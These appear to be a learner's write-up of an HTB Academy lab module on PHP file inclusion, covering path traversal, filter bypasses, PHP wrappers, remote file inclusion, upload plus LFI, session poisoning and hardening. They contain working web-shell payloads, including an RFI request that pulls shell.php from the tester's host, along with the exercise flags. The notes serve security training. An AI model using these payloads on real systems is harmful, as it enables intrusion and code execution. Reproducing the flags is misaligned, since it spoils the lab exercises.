# HTB Academy — CWES File Inclusion Module Notes

**Module:** File Inclusion (Sections 1–11)  
**Topics:** LFI | Path Traversal | Filter Bypasses | PHP Filters | PHP Wrappers | RFI | Upload+LFI | Log Poisoning | Automated Scanning | Prevention

---

## Section-by-Section Notes

### Section 1: Intro — Read vs Execute vs Remote URL

The critical distinction is what the vulnerable function can do:
- **Read only** (`file_get_contents`, `fopen`): can leak files but not execute code
- **Read + Execute** (`include`, `require`, `res.render`): LFI can lead to RCE
- **Read + Execute + Remote URL** (`include` in PHP, Java `import`): full RFI possible

PHP `include()` is the most dangerous — all three capabilities. Always determine which function is likely in use based on observed app behavior.

---

### Section 2: Basic LFI (Exercise)

**Target:** `154.57.164.82:31418`

**Key discovery:** Direct absolute path `/etc/passwd` failed because the app prepends a directory (`./languages/`), making the path `./languages//etc/passwd`. Path traversal with `../../../../etc/passwd` worked.

**Lesson:** Always try path traversal by default — it works whether or not a prefix is appended (extra `../` past root stays at root).

File content renders inline inside the page HTML — content appears between the blog card div tags, not as a separate response. Grep for the flag pattern rather than expecting clean output.

**Answers:**
- Q1 (user starting with "b"): `barry`
- Q2 (flag): `HTB{n3v3r_tru$t_u$3r_!nput}`

---

### Section 3: Basic Bypasses (Exercise)

**Target:** `154.57.164.78:30291`

**Filters present:** Two combined — approved path regex AND non-recursive `../` removal.

**Discovery process:**
1. First attempt with `./languages/` prefix → "Illegal path specified!" → wrong prefix
2. Nav links showed `language=languages/en.php` (no `./`) → correct prefix is `languages/`
3. Combining approved prefix + `....//` bypass → success

**Working payload:**
```
?language=languages/....//....//....//....//flag.txt
```

`....//` survives non-recursive str_replace('../', '', $input): removes `../` at position 2-4, leaving `../`.

**Key lesson:** Always read the app's existing nav links to find the exact approved path prefix — don't guess.

**Flag:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

---

### Section 4: PHP Filters (Exercise)

**Target:** `154.57.164.68:32061`

**Task:** Fuzz for PHP files, read config file, find DB password.

**Process:**
- Fuzz found `configure.php` (NOT `config.php` — always fuzz, don't assume filenames)
- Read via base64 filter: `php://filter/read=convert.base64-encode/resource=configure`
- `.php` extension auto-appended by app — omit from resource name

**Decoded config:**
```php
$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);
$API_KEY = "Awew242GDshrf46+35/k";
```

**Key lesson:** PHP files that redirect/403 when accessed directly still expose full source via LFI + base64 filter. The access restriction only applies to direct HTTP requests.

**Flag (DB password):** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

---

### Section 5: PHP Wrappers (Exercise)

**Target:** `154.57.164.64:31821`

**Confirmed:** `allow_url_include = On` (read from `/etc/php/7.4/apache2/php.ini` via base64 filter)

**data:// wrapper failed** — blocked by app-level filter even though allow_url_include was On.

**php://input worked:**
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id"
```

**Discovery:** Flag was not named `flag.txt` — it was `37809e2f8952f06139011994726d9ef1.txt` in `/`. Always `ls /` first to see what's there.

**Key lesson:** `allow_url_include = On` doesn't guarantee `data://` works — app may filter it. Always have php://input as fallback. The `+` URL encoding for spaces works in GET params.

**Flag:** `HTB{d!$46l3_r3m0t3_url_!nclud3}`

---

### Section 6: Remote File Inclusion (Exercise)

**Target:** `10.129.29.114` (VPN)

**Key issue:** HTTP server must be running BEFORE attempting RFI. PHP throws stream connection refused errors (visible as words like "refused", "failed", "stream" mixed into page HTML) if server is unreachable.

**Server was on port 85** (`python3 -m http.server 85`) — port matters in the URL.

**Finding the flag:**
```bash
curl -s "http://10.129.29.114/index.php?language=http://10.10.14.85:85/shell.php&cmd=find+/+-maxdepth+2+-name+'*.txt'+2>/dev/null"
# Flag file: /exercise/flag.txt
```

**Key lessons:**
- Single quotes around `*.txt` in URL can break — use the find output extraction approach
- Flag is in `/exercise/` not `/` — always check find output before assuming location
- RFI error output (connection refused) blends into page HTML — look for "refused", "Failed", "stream" as indicators

**Flag:** `99a8fc05f033f2fc0cf9a6f9826f83f4`

---

### Section 7: LFI + File Uploads (Exercise)

**Target:** `154.57.164.81:32643`

**Upload form:** `<input name="uploadFile">` → POST to `/upload.php`

**Attack:**
1. `echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif`
2. `curl -s -F "uploadFile=@/tmp/shell.gif" "http://TARGET/upload.php"` → "File successfully uploaded"
3. `?language=./profile_images/shell.gif&cmd=id` → `GIF8uid=33(www-data)...`

**GIF magic bytes (`GIF8`) appear in output** before the command result — use `grep -oP 'GIF8\K.*'` to strip them.

**Finding flag:**
```python
re.findall(r'GIF8(.*?)(?:<br|<p|</div)', response, re.S)
# Returns: /2f40d853e2d4768d87da1c81772bae0a.txt
```

**Key lesson:** The upload doesn't need to be vulnerable — only the LFI include needs execute capability. GIF magic bytes satisfy image content-type checks while still executing as PHP.

**Flag:** `HTB{upl04d+lf!+3x3cut3=rc3}`

---

### Section 8: Log Poisoning (Exercise)

**Target:** `154.57.164.72:32676`

**Q1 — PHP Session Poisoning:**

Two-request pattern:
1. **Poison:** `curl -G --data-urlencode 'language=<?php system($_GET["cmd"]); ?>'` 
2. **Include:** `?language=/var/lib/php/sessions/sess_$SESSID&cmd=pwd`

**Why it works:** PHP writes session to disk at end of request. The include request reads the session file from disk (which still has the PHP code from step 1) BEFORE the session is overwritten with the new value. The include overwrites the session at end of the include request.

**Reading the output:** The cmd output is embedded INSIDE the serialized session string:
```
selected_language|s:30:"/var/www/html\n";preference|s:7:"Spanish";
```
`selected_language|s:30:"` = prefix | `/var/www/html` = **cmd output** | `";preference...` = suffix

**Important:** Use single quotes for `--data-urlencode` value to prevent bash from expanding `$_GET`.

**Q1 answer (pwd):** `/var/www/html`

**Q2 — Log Poisoning:**

Apache logs not readable by www-data (expected on this server). Tried:
- `/var/log/apache2/access.log` → empty (not readable)
- `/proc/self/environ` → empty (not readable)
- `/proc/self/fd/N` → nothing  
- `php://input` → not enabled

Fell back to session poisoning again for Q2 to read the flag.

**Key lesson:** Session poisoning is the most reliable RCE path for log poisoning section. Apache logs often require root/adm. Always re-poison before every command.

**Flags:**
- Q1 (pwd): `/var/www/html`
- Q2 (flag): `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

---

### Section 9: Automated Scanning (Exercise)

**Target:** `154.57.164.75:32615`

**Critical lesson — two filter sizes:**

Run 1 (wrong): `ffuf -fs 2309` (baseline only) → hundreds of false positive matches
- These were all "failed include" responses (different size from default content, but not actual LFI)

Run 2 (correct): `ffuf -fs 2309,1935` (baseline + failed-include) → 6 real working payloads

**Process:**
1. `curl -s "URL" | wc -c` → baseline = 2309
2. `curl -s "URL?view=nonexistent" | wc -c` → failed include = 1935
3. Fuzz params: found `view` parameter
4. Fuzz LFI wordlist filtering both → real working payloads (all required 20+ `../` traversal)
5. Read flag: `?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt`

**Key lesson:** A failed include has a different page size from the baseline. Without filtering both, ffuf floods you with false positives. The working payloads needed extreme `../` depth even though the webroot was only 3 levels deep — use the wordlist rather than calculating manually.

**Flag:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

---

### Section 10: Prevention

**Q1:** Apache php.ini path = `/etc/php/7.4/apache2/php.ini`

**Q2:** To block `system()`:
```ini
disable_functions = system
```
Error log message: `system() has been disabled for **security** reasons`

**Key prevention techniques:**
- Never pass user input directly to include/file functions — use whitelist mapping
- `basename()` to strip directory components from filenames
- Recursive `../` removal (not just one-pass `str_replace`)
- `allow_url_fopen = Off` and `allow_url_include = Off` in php.ini
- `open_basedir = /var/www` to restrict file access to webroot
- Disable dangerous PHP extensions (`expect`, `mod_userdir`)
- WAF in permissive mode as early warning system

---

## Flags Collected

| Section | Target | Attack | Flag/Answer |
|---------|--------|--------|-------------|
| Section 2 | `154.57.164.82:31418` | Path traversal LFI | User: `barry` / Flag: `HTB{n3v3r_tru$t_u$3r_!nput}` |
| Section 3 | `154.57.164.78:30291` | Approved path + non-recursive bypass | `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` |
| Section 4 | `154.57.164.68:32061` | php://filter base64 source read | `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}` |
| Section 5 | `154.57.164.64:31821` | php://input RCE | `HTB{d!$46l3_r3m0t3_url_!nclud3}` |
| Section 6 | `10.129.29.114` | RFI via HTTP | `99a8fc05f033f2fc0cf9a6f9826f83f4` |
| Section 7 | `154.57.164.81:32643` | Upload + LFI | `HTB{upl04d+lf!+3x3cut3=rc3}` |
| Section 8 | `154.57.164.72:32676` | Session poisoning (x2) | pwd: `/var/www/html` / `HTB{1095_5#0u1d_n3v3r_63_3xp053d}` |
| Section 9 | `154.57.164.75:32615` | Automated scan + deep traversal | `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}` |
| Section 10 | `10.129.29.112` | PHP hardening | `/etc/php/7.4/apache2/php.ini` / `security` |

---

## Key Lessons

1. **Path traversal is the default** — use `../../../../` regardless; extra levels past root are harmless
2. **Read nav links before guessing filter prefix** — the exact approved path is always visible in existing links
3. **`....//` beats non-recursive `../` removal** — removing `../` from `....//` yields `../`
4. **php://filter reveals source of any PHP file** — even ones that 403 on direct access
5. **php://input is more reliable than data://** — data:// is commonly filtered
6. **Always `ls /` before `cat`** — flags are rarely named `flag.txt` in real exercises
7. **Session poisoning: single quotes required** — `'language=<?php system($_GET["cmd"]); ?>'` prevents bash from expanding `$_GET`
8. **Session poisoning: re-poison before every command** — the include request overwrites the session
9. **Apache access logs often unreadable** — fall back to session poisoning or Nginx logs
10. **ffuf needs TWO filter sizes** — baseline AND failed-include; using only baseline produces massive false positives
11. **RFI server must be running before the request** — PHP stream errors (refused/failed) blend into HTML output
12. **GIF magic bytes (`GIF8`) prepend upload+LFI output** — use `grep -oP 'GIF8\K.*'` to strip
